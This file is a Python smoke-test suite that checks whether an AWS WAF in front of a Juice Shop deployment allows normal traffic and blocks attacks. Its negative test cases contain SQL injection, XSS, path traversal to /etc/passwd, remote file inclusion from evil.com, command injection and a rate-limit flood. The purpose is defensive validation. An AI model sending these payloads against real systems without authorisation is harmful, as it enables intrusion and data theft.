#!/usr/bin/env python3
"""
WAF Security Smoke Test Suite
=============================

Comprehensive testing suite for validating AWS WAF rules and edge security configuration.
Tests both positive (allowed) and negative (blocked) scenarios to ensure proper protection.

Usage:
    python smoke_test.py --url "$(terraform output -raw juice_shop_url)"
    python smoke_test.py --url "$(terraform output -raw juice_shop_url)" --output-format json
    python smoke_test.py --url "$(terraform output -raw juice_shop_url)" --verbose

Author: Security Engineering Team
Version: 1.0
"""

import argparse
import json
import requests
import time
import sys
from datetime import datetime, timezone
from typing import Dict, List, Tuple, Optional
import urllib3
from dataclasses import dataclass, asdict
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

@dataclass
class TestResult:
    """Test result data structure."""
    test_name: str
    description: str
    expected_status: int
    actual_status: int
    response_time: float
    passed: bool
    error: Optional[str] = None
    response_headers: Optional[Dict] = None
    blocked_by_waf: bool = False

@dataclass
class TestSuite:
    """Test suite results container."""
    url: str
    timestamp: str
    total_tests: int
    passed_tests: int
    failed_tests: int
    execution_time: float
    tests: List[TestResult]

class WAFSmokeTest:
    """WAF smoke test execution engine."""
    
    def __init__(self, base_url: str, timeout: int = 10, verbose: bool = False,
                 rate_requests: int = 300, rate_delay: float = 0.02,
                 rate_timeout: int = 60, rate_concurrency: int = 10):
        """Initialize the test suite."""
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        
        # Configure session
        self.session.headers.update({
            'User-Agent': 'WAF-SmokeTest/1.0 (Security Testing)'
        })
        
        # Test configurations
        self.test_configs = self._define_test_cases()

        # Rate limit test tuning
        self.rate_requests = rate_requests
        self.rate_delay = rate_delay
        self.rate_timeout = rate_timeout
        self.rate_concurrency = max(1, rate_concurrency)
        self.rate_block_threshold = 3
    
    def _define_test_cases(self) -> List[Dict]:
        """Define comprehensive test cases for WAF validation."""
        return [
            # Positive Tests (Should be allowed - 200 OK)
            {
                'name': 'basic_homepage',
                'description': 'Basic homepage access should be allowed',
                'method': 'GET',
                'path': '/',
                'expected_status': 200,
                'headers': {},
                'data': None
            },
            {
                'name': 'products_page',
                'description': 'Products page should be accessible',
                'method': 'GET',
                'path': '/#/products',
                'expected_status': 200,
                'headers': {},
                'data': None
            },
            {
                'name': 'login_page',
                'description': 'Login page should be accessible',
                'method': 'GET',
                'path': '/#/login',
                'expected_status': 200,
                'headers': {},
                'data': None
            },
            {
                'name': 'legitimate_search',
                'description': 'Legitimate product search should work',
                'method': 'GET',
                'path': '/rest/products/search?q=apple',
                'expected_status': 200,
                'headers': {},
                'data': None
            },
            
            # Negative Tests (Should be blocked - 403 Forbidden)
            {
                'name': 'juice_shop_sqli',
                'description': 'Juice Shop specific SQL injection should be blocked',
                'method': 'GET',
                'path': "/rest/products/search?q=' OR 1=1--",
                'expected_status': 403,
                'headers': {},
                'data': None
            },
            {
                'name': 'classic_sqli_union',
                'description': 'Classic SQL injection UNION attack should be blocked',
                'method': 'GET',
                'path': "/rest/products/search?q=apple' UNION SELECT * FROM users--",
                'expected_status': 403,
                'headers': {},
                'data': None
            },
            {
                'name': 'xss_script_tag',
                'description': 'XSS script tag injection should be blocked',
                'method': 'GET',
                'path': '/rest/products/search?q=<script>alert("xss")</script>',
                'expected_status': 403,
                'headers': {},
                'data': None
            },
            {
                'name': 'path_traversal',
                'description': 'Path traversal attack should be blocked',
                'method': 'GET',
                'path': '/../../etc/passwd',
                'expected_status': 403,
                'headers': {},
                'data': None
            },
            {
                'name': 'rfi_attempt',
                'description': 'Remote file inclusion attempt should be blocked',
                'method': 'GET',
                'path': '/rest/products?include=http://evil.com/shell.php',
                'expected_status': 403,
                'headers': {},
                'data': None
            },
            {
                'name': 'command_injection',
                'description': 'Command injection attempt should be blocked',
                'method': 'GET',
                'path': '/rest/products/search?q=apple; cat /etc/passwd',
                'expected_status': 403,
                'headers': {},
                'data': None
            },
            
            # Rate Limiting Tests
            {
                'name': 'rate_limit_test',
                'description': 'High rate requests should eventually be blocked',
                'method': 'GET',
                'path': '/rest/products',
                'expected_status': 200,  # Will be overridden in rate limit test
                'headers': {},
                'data': None,
                'special': 'rate_limit'
            },
            
            # Headers and Protocol Tests
            {
                'name': 'malicious_user_agent',
                'description': 'Requests with suspicious user agents should be blocked',
                'method': 'GET',
                'path': '/',
                'expected_status': 403,
                'headers': {'User-Agent': 'sqlmap/1.0 (http://sqlmap.org)'},
                'data': None
            },
            {
                'name': 'large_header',
                'description': 'Requests with oversized headers should be blocked',
                'method': 'GET',
                'path': '/',
                'expected_status': 403,
                'headers': {'X-Large-Header': 'A' * 8192},
                'data': None
            },
            
            # POST Request Tests
            {
                'name': 'sqli_post_body',
                'description': 'SQL injection in POST body should be blocked',
                'method': 'POST',
                'path': '/rest/user/login',
                'expected_status': 403,
                'headers': {'Content-Type': 'application/json'},
                'data': json.dumps({"email": "admin' OR '1'='1", "password": "test"})
            }
        ]
    
    def _execute_single_test(self, test_config: Dict) -> TestResult:
        """Execute a single test case."""
        start_time = time.time()
        test_name = test_config['name']
        
        try:
            # Special handling for rate limit test
            if test_config.get('special') == 'rate_limit':
                return self._execute_rate_limit_test(test_config)
            
            # Prepare request
            url = f"{self.base_url}{test_config['path']}"
            method = test_config['method']
            headers = test_config.get('headers', {})
            data = test_config.get('data')
            
            if self.verbose:
                logger.info(f"Executing test: {test_name}")
                logger.info(f"URL: {url}")
                logger.info(f"Method: {method}")
                if headers:
                    logger.info(f"Headers: {headers}")
                if data:
                    logger.info(f"Data: {data}")
            
            # Make request
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                data=data,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            response_time = time.time() - start_time
            
            # Check if blocked by WAF
            blocked_by_waf = self._is_blocked_by_waf(response)
            
            # Evaluate result
            passed = response.status_code == test_config['expected_status']
            
            return TestResult(
                test_name=test_name,
                description=test_config['description'],
                expected_status=test_config['expected_status'],
                actual_status=response.status_code,
                response_time=response_time,
                passed=passed,
                response_headers=dict(response.headers),
                blocked_by_waf=blocked_by_waf
            )
            
        except requests.exceptions.RequestException as e:
            response_time = time.time() - start_time
            return TestResult(
                test_name=test_name,
                description=test_config['description'],
                expected_status=test_config['expected_status'],
                actual_status=0,
                response_time=response_time,
                passed=False,
                error=str(e)
            )
    
    def _execute_rate_limit_test(self, test_config: Dict) -> TestResult:
        """Execute rate limiting test by sending many requests quickly with optional concurrency."""
        start_time = time.time()
        url = f"{self.base_url}{test_config['path']}"

        try:
            blocked_count = 0
            sent = 0
            max_requests = self.rate_requests

            logger.info(
                f"Starting rate limit test: up to {max_requests} requests, "
                f"concurrency={self.rate_concurrency}, timeout={self.rate_timeout}s"
            )

            def do_req() -> int:
                try:
                    r = self.session.get(url, timeout=5, verify=False)
                    return r.status_code
                except Exception:
                    return -1

            with ThreadPoolExecutor(max_workers=self.rate_concurrency) as executor:
                futures = set()
                while (time.time() - start_time) < self.rate_timeout and sent < max_requests and blocked_count < self.rate_block_threshold:
                    # Top up the in-flight futures to concurrency
                    while len(futures) < self.rate_concurrency and sent < max_requests:
                        futures.add(executor.submit(do_req))
                        sent += 1

                    # Process completed ones
                    done, futures = wait_any(futures)
                    for fut in done:
                        code = fut.result()
                        if code == 403 or (code >= 500 and code < 600):
                            blocked_count += 1

                    if self.rate_delay:
                        time.sleep(self.rate_delay)

            response_time = time.time() - start_time

            passed = blocked_count >= self.rate_block_threshold
            expected_status = 403 if passed else 200

            return TestResult(
                test_name=test_config['name'],
                description=f"Rate limiting test - {blocked_count}/{sent} requests blocked",
                expected_status=expected_status,
                actual_status=403 if blocked_count > 0 else 200,
                response_time=response_time,
                passed=passed,
                blocked_by_waf=blocked_count > 0
            )

        except Exception as e:
            response_time = time.time() - start_time
            return TestResult(
                test_name=test_config['name'],
                description=test_config['description'],
                expected_status=test_config['expected_status'],
                actual_status=0,
                response_time=response_time,
                passed=False,
                error=str(e)
            )
    
    def _is_blocked_by_waf(self, response: requests.Response) -> bool:
        """Determine if request was blocked by WAF based on response characteristics."""
        # Check status code
        if response.status_code == 403:
            return True
        
        # Check for WAF-specific headers
        waf_headers = [
            'x-amzn-waf',
            'x-amz-cf-id',
            'x-cache'
        ]
        
        for header in waf_headers:
            if header in response.headers:
                return True
        
        # Check response body for WAF indicators
        if response.text:
            waf_indicators = [
                'Request blocked',
                'Access denied',
                'WAF',
                'CloudFront'
            ]
            
            for indicator in waf_indicators:
                if indicator.lower() in response.text.lower():
                    return True
        
        return False
    
    def run_all_tests(self) -> TestSuite:
        """Execute all test cases and return results."""
        start_time = time.time()
        results = []
        
        logger.info(f"Starting WAF smoke tests against: {self.base_url}")
        logger.info(f"Total test cases: {len(self.test_configs)}")
        
        for i, test_config in enumerate(self.test_configs, 1):
            logger.info(f"Running test {i}/{len(self.test_configs)}: {test_config['name']}")
            result = self._execute_single_test(test_config)
            results.append(result)
            
            # Brief pause between tests
            time.sleep(0.5)
        
        execution_time = time.time() - start_time
        passed_tests = sum(1 for r in results if r.passed)
        failed_tests = len(results) - passed_tests
        
        return TestSuite(
            url=self.base_url,
            timestamp=datetime.now(timezone.utc).isoformat(),
            total_tests=len(results),
            passed_tests=passed_tests,
            failed_tests=failed_tests,
            execution_time=execution_time,
            tests=results
        )
    
    def generate_report(self, test_suite: TestSuite, format: str = 'text') -> str:
        """Generate test report in specified format."""
        if format == 'json':
            return json.dumps(asdict(test_suite), indent=2)
        
        elif format == 'html':
            return self._generate_html_report(test_suite)
        
        else:  # text format
            return self._generate_text_report(test_suite)
    
    def _generate_text_report(self, test_suite: TestSuite) -> str:
        """Generate human-readable text report."""
        report = []
        report.append("=" * 80)
        report.append("WAF SECURITY SMOKE TEST RESULTS")
        report.append("=" * 80)
        report.append("")
        report.append(f"Target URL: {test_suite.url}")
        report.append(f"Test Timestamp: {test_suite.timestamp}")
        report.append(f"Total Tests: {test_suite.total_tests}")
        report.append(f"Passed: {test_suite.passed_tests}")
        report.append(f"Failed: {test_suite.failed_tests}")
        report.append(f"Success Rate: {(test_suite.passed_tests/test_suite.total_tests)*100:.1f}%")
        report.append(f"Execution Time: {test_suite.execution_time:.2f} seconds")
        report.append("")
        
        # Summary by category
        positive_tests = [t for t in test_suite.tests if t.expected_status == 200]
        negative_tests = [t for t in test_suite.tests if t.expected_status == 403]
        
        report.append("SUMMARY BY CATEGORY:")
        report.append("-" * 40)
        report.append(f"Positive Tests (Should Allow): {sum(1 for t in positive_tests if t.passed)}/{len(positive_tests)}")
        report.append(f"Negative Tests (Should Block): {sum(1 for t in negative_tests if t.passed)}/{len(negative_tests)}")
        report.append("")
        
        # Detailed results
        report.append("DETAILED TEST RESULTS:")
        report.append("-" * 40)
        
        for test in test_suite.tests:
            status_icon = "PASS" if test.passed else "FAIL"
            waf_indicator = "[WAF] " if test.blocked_by_waf else ""
            
            report.append(f"{status_icon} {waf_indicator}{test.test_name}")
            report.append(f"   Description: {test.description}")
            report.append(f"   Expected: {test.expected_status}, Got: {test.actual_status}")
            report.append(f"   Response Time: {test.response_time:.3f}s")
            
            if test.error:
                report.append(f"   Error: {test.error}")
            
            if not test.passed:
                if test.expected_status == 403 and test.actual_status == 200:
                    report.append("   WARNING: Attack was not blocked!")
                elif test.expected_status == 200 and test.actual_status == 403:
                    report.append("   WARNING: Legitimate request was blocked (false positive)!")
            
            report.append("")
        
        # Security recommendations
        failed_security_tests = [t for t in negative_tests if not t.passed]
        if failed_security_tests:
            report.append("SECURITY RECOMMENDATIONS:")
            report.append("-" * 40)
            for test in failed_security_tests:
                report.append(f"• Review WAF rules for: {test.test_name}")
                report.append(f"  Attack type was not properly blocked")
            report.append("")
        
        return "\n".join(report)
    
    def _generate_html_report(self, test_suite: TestSuite) -> str:
        """Generate HTML report."""
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>WAF Smoke Test Results</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .header {{ background-color: #f0f0f0; padding: 20px; border-radius: 5px; }}
                .summary {{ margin: 20px 0; }}
                .test-result {{ margin: 10px 0; padding: 10px; border: 1px solid #ddd; border-radius: 3px; }}
                .passed {{ background-color: #d4edda; }}
                .failed {{ background-color: #f8d7da; }}
                .metric {{ display: inline-block; margin-right: 20px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>WAF Security Smoke Test Results</h1>
                <p><strong>Target:</strong> {test_suite.url}</p>
                <p><strong>Timestamp:</strong> {test_suite.timestamp}</p>
            </div>
            
            <div class="summary">
                <div class="metric"><strong>Total Tests:</strong> {test_suite.total_tests}</div>
                <div class="metric"><strong>Passed:</strong> {test_suite.passed_tests}</div>
                <div class="metric"><strong>Failed:</strong> {test_suite.failed_tests}</div>
                <div class="metric"><strong>Success Rate:</strong> {(test_suite.passed_tests/test_suite.total_tests)*100:.1f}%</div>
                <div class="metric"><strong>Execution Time:</strong> {test_suite.execution_time:.2f}s</div>
            </div>
            
            <h2>Test Results</h2>
        """
        
        for test in test_suite.tests:
            css_class = "passed" if test.passed else "failed"
            status_icon = "PASS" if test.passed else "FAIL"
            waf_indicator = "[WAF] " if test.blocked_by_waf else ""
            
            html += f"""
            <div class="test-result {css_class}">
                <h3>{status_icon} {waf_indicator}{test.test_name}</h3>
                <p><strong>Description:</strong> {test.description}</p>
                <p><strong>Expected:</strong> {test.expected_status} | <strong>Actual:</strong> {test.actual_status}</p>
                <p><strong>Response Time:</strong> {test.response_time:.3f}s</p>
            """
            
            if test.error:
                html += f"<p><strong>Error:</strong> {test.error}</p>"
            
            html += "</div>"
        
        html += """
        </body>
        </html>
        """
        
        return html

def wait_any(futures):
    """Wait until at least one future completes, return (done, pending)."""
    done = set()
    pending = set(futures)
    if not futures:
        return done, pending
    for fut in as_completed(futures, timeout=0.5):
        done.add(fut)
        pending.discard(fut)
        break
    # Collect any other already-completed futures without blocking
    more_done = [f for f in list(pending) if f.done()]
    for f in more_done:
        done.add(f)
        pending.discard(f)
    return done, pending

def main():
    """Main function for command-line execution."""
    parser = argparse.ArgumentParser(
        description='WAF Security Smoke Test Suite',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic smoke test
  python smoke_test.py --url http://juice-shop-alb-123456789.us-east-1.elb.amazonaws.com

  # JSON output for automation
  python smoke_test.py --url http://example.com --output-format json

  # Save results to file
  python smoke_test.py --url http://example.com --output results/smoke_test.json

  # Verbose mode with detailed logging
  python smoke_test.py --url http://example.com --verbose
        """
    )
    
    parser.add_argument('--url', required=True,
                       help='Base URL of the application to test')
    parser.add_argument('--output-format', choices=['text', 'json', 'html'],
                       default='text', help='Output format')
    parser.add_argument('--output', 
                       help='Output file path (default: stdout)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose logging')
    # Rate limit test controls
    parser.add_argument('--rate-requests', type=int, default=300,
                       help='Max requests to send in the rate-limit test')
    parser.add_argument('--rate-timeout', type=int, default=60,
                       help='Time budget in seconds for the rate-limit test')
    parser.add_argument('--rate-delay', type=float, default=0.02,
                       help='Delay between batches in seconds for the rate-limit test')
    parser.add_argument('--rate-concurrency', type=int, default=10,
                       help='Concurrency for the rate-limit test')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize and run tests
    tester = WAFSmokeTest(
        base_url=args.url,
        timeout=args.timeout,
        verbose=args.verbose,
        rate_requests=args.rate_requests,
        rate_delay=args.rate_delay,
        rate_timeout=args.rate_timeout,
        rate_concurrency=args.rate_concurrency
    )
    
    try:
        test_suite = tester.run_all_tests()
        report = tester.generate_report(test_suite, args.output_format)
        
        # Output results
        if args.output:
            with open(args.output, 'w') as f:
                f.write(report)
            print(f"Results saved to: {args.output}")
        else:
            print(report)
        
        # Exit with error code if tests failed
        if test_suite.failed_tests > 0:
            logger.warning(f"{test_suite.failed_tests} tests failed")
            
            # Critical failure if security tests failed
            security_failures = [t for t in test_suite.tests 
                               if not t.passed and t.expected_status == 403]
            if security_failures:
                logger.error(f"{len(security_failures)} security tests failed - potential security gaps!")
                sys.exit(2)  # Critical security failure
            else:
                sys.exit(1)  # General test failure
        
        logger.info("All tests passed successfully!")
        
    except Exception as e:
        logger.error(f"Test execution failed: {str(e)}")
        sys.exit(3)

if __name__ == '__main__':
    main()
